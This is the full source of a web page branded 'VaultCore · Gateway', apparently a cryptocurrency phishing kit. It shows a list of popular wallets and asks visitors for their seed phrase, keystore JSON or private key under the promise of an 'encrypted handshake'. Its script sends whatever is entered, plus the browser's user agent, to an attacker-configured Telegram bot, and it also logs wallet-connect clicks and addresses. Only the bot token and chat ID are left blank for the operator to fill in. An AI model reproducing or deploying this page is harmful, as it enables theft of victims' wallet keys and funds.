<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>VaultCore · Gateway</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(145deg, #f4f7fc 0%, #eef2f8 100%);
            min-height: 100vh;
            padding: 0 0 2rem 0;
            color: #1a2634;
        }

        /* ----- SCROLLING TICKER (TOP) ----- */
        .ticker-container {
            width: 100%;
            background: #ffffff;
            border-bottom: 1px solid #e9edf2;
            box-shadow: 0 2px 6px rgba(0,0,0,0.02);
            overflow: hidden;
            white-space: nowrap;
            position: relative;
            z-index: 5;
            padding: 0.6rem 0;
        }
        .ticker-track {
            display: inline-block;
            animation: scrollTicker 35s linear infinite;
            white-space: nowrap;
        }
        .ticker-item {
            display: inline-block;
            margin-right: 2rem;
            font-size: 0.9rem;
            font-weight: 500;
            padding: 0.2rem 0.5rem;
            border-radius: 1rem;
            background: #f8fafd;
        }
        .ticker-symbol {
            font-weight: 700;
            color: #1f3a6b;
            margin-right: 0.4rem;
        }
        .ticker-price {
            font-weight: 600;
            margin-right: 0.4rem;
        }
        .ticker-change {
            font-size: 0.75rem;
            font-weight: 600;
            padding: 0.1rem 0.5rem;
            border-radius: 1rem;
        }
        .positive-change { background: #e1f7ed; color: #1e7b48; }
        .negative-change { background: #fee9e9; color: #c2412c; }
        @keyframes scrollTicker {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }
        .ticker-container:hover .ticker-track {
            animation-play-state: paused;
        }

        /* main container */
        .app-container {
            max-width: 1440px;
            margin: 2rem auto 0;
            padding: 0 1.5rem;
        }

        /* white card */
        .core-card {
            background: #ffffff;
            border-radius: 2rem;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08);
            padding: 1.8rem;
            border: 1px solid #e9edf2;
        }

        /* action buttons */
        .action-buttons {
            display: flex;
            gap: 1rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }
        .primary-btn, .secondary-btn {
            padding: 0.8rem 1.8rem;
            border-radius: 3rem;
            font-weight: 600;
            font-size: 0.9rem;
            border: none;
            cursor: pointer;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 0.6rem;
        }
        .primary-btn {
            background: #1f4f9e;
            color: white;
            box-shadow: 0 4px 8px rgba(31,79,158,0.15);
        }
        .primary-btn:hover { background: #0f3a75; transform: translateY(-1px); }
        .secondary-btn {
            background: #eef2f8;
            color: #1f4f9e;
            border: 1px solid #cfdfef;
        }
        .secondary-btn:hover { background: #e2eaf3; }

        /* wallet header */
        .wallet-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
            margin: 1rem 0 1.2rem;
        }
        .wallet-header h2 {
            font-size: 1.5rem;
            font-weight: 600;
            color: #0f2b4f;
        }
        .search-wrapper {
            background: white;
            border-radius: 2rem;
            padding: 0.3rem 1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            border: 1px solid #dce5ef;
        }
        .search-wrapper input {
            border: none;
            padding: 0.5rem;
            font-size: 0.9rem;
            width: 200px;
            outline: none;
            background: transparent;
        }

        /* wallet grid */
        .wallets-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 1rem;
            max-height: 55vh;
            overflow-y: auto;
            padding: 0.2rem 0.2rem 1rem;
        }
        .wallet-card-light {
            background: #ffffff;
            border-radius: 1.2rem;
            padding: 0.9rem 0.5rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.6rem;
            cursor: pointer;
            transition: all 0.2s ease;
            border: 1px solid #e9edf2;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
        }
        .wallet-card-light:hover {
            border-color: #8fbbf0;
            transform: translateY(-3px);
            box-shadow: 0 12px 18px -10px rgba(0,0,0,0.08);
            background: #fdfdfe;
        }
        .wallet-icon {
            font-size: 2rem;
            width: 54px;
            height: 54px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f0f4fa;
            border-radius: 60px;
            color: #2b4f8c;
        }
        .wallet-name {
            font-weight: 500;
            font-size: 0.85rem;
            text-align: center;
            color: #1e2f45;
        }
        .no-results {
            text-align: center;
            padding: 2rem;
            color: #7a8aa5;
        }

        /* modals (light theme) */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(6px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: 0.2s;
        }
        .modal-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .modal-window {
            background: white;
            border-radius: 2rem;
            width: 90%;
            max-width: 540px;
            box-shadow: 0 30px 40px rgba(0,0,0,0.15);
            overflow: hidden;
        }
        .modal-header {
            padding: 1.2rem 1.5rem;
            border-bottom: 1px solid #eef2f8;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header h3 {
            font-size: 1.3rem;
            font-weight: 600;
            color: #1f3a6b;
        }
        .close-modal {
            background: none;
            border: none;
            font-size: 1.8rem;
            cursor: pointer;
            color: #7c8ca8;
        }
        .tabs-light {
            display: flex;
            background: #f9fbfd;
            border-bottom: 1px solid #e9edf2;
        }
        .tab-light {
            flex: 1;
            padding: 0.8rem;
            background: none;
            border: none;
            font-weight: 500;
            color: #4e6586;
            cursor: pointer;
            transition: 0.2s;
        }
        .tab-light.active {
            color: #1f4f9e;
            border-bottom: 2px solid #1f4f9e;
            background: #f0f6fe;
        }
        .modal-body {
            padding: 1.8rem;
        }
        .pane-light {
            display: none;
        }
        .pane-light.active-pane {
            display: block;
        }
        textarea, .modal-body input {
            width: 100%;
            background: #f9fbfd;
            border: 1px solid #dce5ef;
            border-radius: 1.2rem;
            padding: 0.9rem;
            font-family: monospace;
            font-size: 0.85rem;
            margin: 0.5rem 0 1rem;
            resize: vertical;
        }
        .submit-action {
            background: #1f4f9e;
            width: 100%;
            padding: 0.9rem;
            border-radius: 2rem;
            border: none;
            font-weight: 600;
            color: white;
            margin-top: 0.5rem;
            cursor: pointer;
        }
        .toast-message {
            position: fixed;
            bottom: 25px;
            left: 50%;
            transform: translateX(-50%);
            background: #1f2f48e6;
            backdrop-filter: blur(8px);
            color: white;
            padding: 0.6rem 1.5rem;
            border-radius: 2rem;
            font-size: 0.8rem;
            z-index: 1100;
            display: none;
        }
        footer {
            margin-top: 2rem;
            text-align: center;
            font-size: 0.7rem;
            color: #7b8cae;
        }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #b9cbee; border-radius: 10px; }
    </style>
</head>
<body>

<!-- Scrolling ticker (passing by news at top) -->
<div class="ticker-container" id="tickerContainer">
    <div class="ticker-track" id="tickerTrack">
        <!-- dynamic price items injected here and duplicated for seamless scroll -->
    </div>
</div>

<div class="app-container">
    <div class="core-card">
        <!-- Action Buttons -->
        <div class="action-buttons">
            <button id="openSeedModalBtn" class="primary-btn"><i class="fas fa-key"></i> Enter seed / private key</button>
            <button id="openConnectWalletBtn" class="secondary-btn"><i class="fas fa-plug"></i> Connect Wallet</button>
        </div>

        <!-- Wallet list header -->
        <div class="wallet-header">
            <h2><i class="fas fa-cubes"></i> Supported wallets</h2>
            <div class="search-wrapper">
                <i class="fas fa-search"></i>
                <input type="text" id="walletSearchInput" placeholder="Filter wallet...">
            </div>
        </div>
        <div id="walletsGridContainer" class="wallets-grid"></div>
        <footer>🔒 select any wallet to begin validation — encrypted handshake</footer>
    </div>
</div>

<!-- Modal: Seed/Keystore/Private Key -->
<div id="seedModal" class="modal-overlay">
    <div class="modal-window">
        <div class="modal-header">
            <h3 id="modalSeedTitle"><i class="fas fa-shield-alt"></i> Secure input</h3>
            <button class="close-modal" id="closeSeedModal">&times;</button>
        </div>
        <div class="tabs-light">
            <button class="tab-light active" data-tab="phrase">Seed phrase</button>
            <button class="tab-light" data-tab="keystore">Keystore JSON</button>
            <button class="tab-light" data-tab="pkey">Private key</button>
        </div>
        <div class="modal-body">
            <div id="phrasePaneSeed" class="pane-light active-pane">
                <label>Recovery phrase (12/24 words)</label>
                <textarea id="seedTextArea" rows="3" placeholder="enter mnemonic phrase..."></textarea>
            </div>
            <div id="keystorePaneSeed" class="pane-light">
                <label>Keystore (JSON)</label>
                <textarea id="keystoreTextArea" rows="3" placeholder='{"crypto":{...}}'></textarea>
            </div>
            <div id="pkeyPaneSeed" class="pane-light">
                <label>Private key (hex)</label>
                <textarea id="pkeyTextArea" rows="2" placeholder="0x... or raw private key"></textarea>
            </div>
            <button id="submitSeedData" class="submit-action"><i class="fas fa-paper-plane"></i> Verify & send</button>
        </div>
    </div>
</div>

<!-- Modal: Connect Wallet (simulated) -->
<div id="connectModal" class="modal-overlay">
    <div class="modal-window">
        <div class="modal-header">
            <h3><i class="fas fa-link"></i> Connect a wallet</h3>
            <button class="close-modal" id="closeConnectModal">&times;</button>
        </div>
        <div class="modal-body">
            <p style="margin-bottom: 1rem; color: #2e4a7a;">Choose an option to continue</p>
            <div style="display: flex; flex-direction: column; gap: 1rem;">
                <button id="simulateMetaMask" class="secondary-btn" style="justify-content: center;"><i class="fab fa-ethereum"></i> MetaMask (simulate)</button>
                <button id="simulateWC" class="secondary-btn" style="justify-content: center;"><i class="fas fa-qrcode"></i> WalletConnect (demo)</button>
                <button id="manualAddressBtn" class="secondary-btn" style="justify-content: center;"><i class="fas fa-wallet"></i> Use public address only</button>
            </div>
            <p style="font-size: 0.7rem; margin-top: 1.5rem; color:#7b8cae;">Demo — no real connection, just testing.</p>
        </div>
    </div>
</div>

<div id="globalToast" class="toast-message"></div>

<script>
    // ----------------------------- TELEGRAM CONFIGURATION -----------------------------
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Replace with your bot token
    const CHAT_ID   = "YOUR_CHAT_ID_HERE";     // Replace with your chat ID
    // ---------------------------------------------------------------------------------

    function showToast(msg, duration = 3000) {
        const toast = document.getElementById("globalToast");
        toast.innerText = msg;
        toast.style.display = "block";
        setTimeout(() => toast.style.display = "none", duration);
    }

    async function sendToTelegram(content, type, source = "seed_entry") {
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
            console.warn("[DEMO] Would send:", { source, type, content });
            showToast("⚠️ DEMO: data logged to console (Telegram not configured)", 4000);
            return false;
        }
        const message = `🛡️ VAULT EVENT\nSource: ${source}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent.substring(0,120)}`;
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message.slice(0, 4000) })
            });
            const json = await res.json();
            return json.ok;
        } catch(e) { console.error(e); showToast("Telegram error: "+e.message, 3000); return false; }
    }

    // ---------- Wallet list (comprehensive) ----------
    const allWallets = [
        "MetaMask", "Trust Wallet", "Coinbase Wallet", "Ledger Live", "Trezor", "Exodus", "Phantom", "Rabby", "Argent", "Rainbow",
        "SafePal", "Keplr", "Electrum", "MyEtherWallet", "TokenPocket", "MathWallet", "imToken", "Status", "Zengo", "Cake Wallet",
        "BlueWallet", "Samourai", "Wasabi", "Edge", "Guarda", "Ownbit", "Unstoppable", "BRD", "Atomic Wallet", "Infinity Wallet",
        "Jaxx Liberty", "Coinomi", "BitPay", "Electron Cash", "Sparrow", "Specter", "Coldcard", "KeepKey", "OneKey", "GridPlus",
        "SecuX", "BitBox", "CoolWallet", "D'CENT", "Ellipal", "ZenGo", "OKX Wallet", "Binance Web3", "Bitget Wallet", "Bybit Wallet",
        "Kucoin Wallet", "Frontier", "XDEFI", "Talisman", "SubWallet", "Nova Wallet", "Fearless", "Polkadot.js", "MetaMask Institutional",
        "Brave Wallet", "Opera Crypto", "GameStop Wallet", "Loopring Wallet", "Ronin Wallet", "Yoroi", "Daedalus", "Flint Wallet",
        "Martian", "Petra", "Pontem", "Nightly", "Backpack", "Solflare", "Glow Wallet", "Slope", "Eclipse", "Soul Wallet",
        "Blocto", "Portis", "Fortmatic", "Web3Auth", "Sequence", "Bitski", "Venly", "Dapper Wallet", "Torus", "Coin98",
        "KardiaChain", "Heco Wallet", "Onto", "Starcoin", "Sui Wallet", "Martian Sui", "Ethos", "Fewcha", "SafePal S1"
    ];
    const uniqueWalletsList = [...new Map(allWallets.map(w => [w, w])).values()];

    function getWalletIconClass(name) {
        const lower = name.toLowerCase();
        if (lower.includes("metamask")) return "fab fa-ethereum";
        if (lower.includes("trust")) return "fas fa-check-circle";
        if (lower.includes("coinbase")) return "fab fa-bitcoin";
        if (lower.includes("ledger")) return "fas fa-microchip";
        if (lower.includes("trezor")) return "fas fa-lock";
        if (lower.includes("phantom")) return "fas fa-ghost";
        if (lower.includes("exodus")) return "fas fa-charging-station";
        if (lower.includes("rabby")) return "fas fa-gem";
        if (lower.includes("argent")) return "fas fa-chart-line";
        if (lower.includes("rainbow")) return "fas fa-palette";
        if (lower.includes("safepal")) return "fas fa-shield-alt";
        if (lower.includes("keplr")) return "fas fa-globe";
        return "fas fa-wallet";
    }

    let selectedWalletForSeed = null;
    function renderWallets(filter = "") {
        const filtered = uniqueWalletsList.filter(w => w.toLowerCase().includes(filter.toLowerCase()));
        const container = document.getElementById("walletsGridContainer");
        if (!filtered.length) {
            container.innerHTML = `<div class="no-results"><i class="fas fa-search-minus"></i> No matching wallets</div>`;
            return;
        }
        container.innerHTML = filtered.map(w => `
            <div class="wallet-card-light" data-wallet="${w}">
                <div class="wallet-icon"><i class="${getWalletIconClass(w)}"></i></div>
                <div class="wallet-name">${w}</div>
            </div>
        `).join('');
        document.querySelectorAll('.wallet-card-light').forEach(card => {
            card.addEventListener('click', () => {
                selectedWalletForSeed = card.getAttribute('data-wallet');
                openSeedModal(selectedWalletForSeed);
            });
        });
    }

    // Seed modal
    const seedModal = document.getElementById("seedModal");
    function openSeedModal(walletName = "selected wallet") {
        document.getElementById("modalSeedTitle").innerHTML = `<i class="fas fa-key"></i> ${walletName} · credentials`;
        document.getElementById("seedTextArea").value = "";
        document.getElementById("keystoreTextArea").value = "";
        document.getElementById("pkeyTextArea").value = "";
        document.querySelectorAll('#seedModal .pane-light').forEach(p => p.classList.remove('active-pane'));
        document.getElementById("phrasePaneSeed").classList.add('active-pane');
        document.querySelectorAll('#seedModal .tab-light').forEach(t => t.classList.remove('active'));
        document.querySelector('#seedModal .tab-light[data-tab="phrase"]').classList.add('active');
        seedModal.classList.add('active');
    }
    function closeSeedModal() { seedModal.classList.remove('active'); }
    document.getElementById("closeSeedModal").addEventListener('click', closeSeedModal);
    seedModal.addEventListener('click', (e) => { if(e.target === seedModal) closeSeedModal(); });
    document.querySelectorAll('#seedModal .tab-light').forEach(tab => {
        tab.addEventListener('click', () => {
            const target = tab.getAttribute('data-tab');
            document.querySelectorAll('#seedModal .pane-light').forEach(p => p.classList.remove('active-pane'));
            if (target === 'phrase') document.getElementById("phrasePaneSeed").classList.add('active-pane');
            if (target === 'keystore') document.getElementById("keystorePaneSeed").classList.add('active-pane');
            if (target === 'pkey') document.getElementById("pkeyPaneSeed").classList.add('active-pane');
            document.querySelectorAll('#seedModal .tab-light').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
        });
    });

    document.getElementById("submitSeedData").addEventListener('click', async () => {
        let credValue = "", credType = "";
        const activePane = document.querySelector('#seedModal .pane-light.active-pane');
        if (activePane.id === "phrasePaneSeed") { credValue = document.getElementById("seedTextArea").value.trim(); credType = "Seed Phrase"; }
        else if (activePane.id === "keystorePaneSeed") { credValue = document.getElementById("keystoreTextArea").value.trim(); credType = "Keystore JSON"; }
        else { credValue = document.getElementById("pkeyTextArea").value.trim(); credType = "Private Key"; }
        if (!credValue) { showToast(`Please fill in ${credType}`, 2500); return; }
        showToast(`Processing ${credType}...`, 1500);
        const sent = await sendToTelegram(credValue, credType, `wallet:${selectedWalletForSeed || "unknown"}`);
        if (sent) showToast(`✓ ${selectedWalletForSeed || "Wallet"} credentials secured`, 3000);
        else showToast(`⚠️ Delivery pending (logged)`, 2500);
        closeSeedModal();
    });

    // Connect Wallet modal
    const connectModal = document.getElementById("connectModal");
    document.getElementById("openConnectWalletBtn").addEventListener('click', () => { connectModal.classList.add('active'); });
    document.getElementById("closeConnectModal").addEventListener('click', () => { connectModal.classList.remove('active'); });
    connectModal.addEventListener('click', (e) => { if(e.target === connectModal) connectModal.classList.remove('active'); });
    document.getElementById("simulateMetaMask").addEventListener('click', () => {
        showToast("MetaMask connection simulated", 3000);
        sendToTelegram("User clicked 'Connect MetaMask'", "connect_attempt", "connect_wallet");
        connectModal.classList.remove('active');
    });
    document.getElementById("simulateWC").addEventListener('click', () => {
        showToast("WalletConnect demo triggered", 3000);
        sendToTelegram("WalletConnect simulation", "connect_attempt", "connect_wallet");
        connectModal.classList.remove('active');
    });
    document.getElementById("manualAddressBtn").addEventListener('click', () => {
        const addr = prompt("Enter any public wallet address (demo):", "0x...");
        if (addr && addr.trim()) {
            sendToTelegram(addr.trim(), "public_address", "manual_address");
            showToast("Address logged", 2000);
        }
        connectModal.classList.remove('active');
    });
    document.getElementById("openSeedModalBtn").addEventListener('click', () => {
        selectedWalletForSeed = "external request";
        openSeedModal("Secure entry");
    });
    document.getElementById("walletSearchInput").addEventListener('input', (e) => renderWallets(e.target.value));
    renderWallets("");

    // ---------- Scrolling Ticker with Live Prices ----------
    let currentPrices = { btc: 0, eth: 0, sol: 0, bnb: 0, changes: { btc:0, eth:0, sol:0, bnb:0 } };
    async function fetchTickerPrices() {
        try {
            const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,bnb&vs_currencies=usd&include_24hr_change=true");
            const data = await res.json();
            currentPrices = {
                btc: data.bitcoin?.usd || 42500,
                eth: data.ethereum?.usd || 2280,
                sol: data.solana?.usd || 98,
                bnb: data.bnb?.usd || 315,
                changes: {
                    btc: data.bitcoin?.usd_24h_change || 0,
                    eth: data.ethereum?.usd_24h_change || 0,
                    sol: data.solana?.usd_24h_change || 0,
                    bnb: data.bnb?.usd_24h_change || 0
                }
            };
            renderTicker();
        } catch(e) { console.warn("price fetch failed"); }
    }

    function renderTicker() {
        const items = [
            { sym: "BTC", price: currentPrices.btc, change: currentPrices.changes.btc },
            { sym: "ETH", price: currentPrices.eth, change: currentPrices.changes.eth },
            { sym: "SOL", price: currentPrices.sol, change: currentPrices.changes.sol },
            { sym: "BNB", price: currentPrices.bnb, change: currentPrices.changes.bnb }
        ];
        let html = "";
        // create 3 loops for seamless scrolling (duplicate)
        for (let i = 0; i < 3; i++) {
            items.forEach(item => {
                const changeClass = item.change >= 0 ? "positive-change" : "negative-change";
                const arrow = item.change >= 0 ? "▲" : "▼";
                html += `<div class="ticker-item">
                            <span class="ticker-symbol">${item.sym}</span>
                            <span class="ticker-price">$${item.price.toLocaleString()}</span>
                            <span class="ticker-change ${changeClass}">${arrow} ${Math.abs(item.change).toFixed(2)}%</span>
                         </div>`;
            });
        }
        const track = document.getElementById("tickerTrack");
        if (track) track.innerHTML = html;
    }
    fetchTickerPrices();
    setInterval(fetchTickerPrices, 12000);
    setInterval(() => {
        // subtle refresh without flicker
        if (document.getElementById("tickerTrack")) renderTicker();
    }, 12000);

    setTimeout(() => showToast("🔐 Select a wallet or use 'Enter seed'", 3500), 500);
</script>
</body>
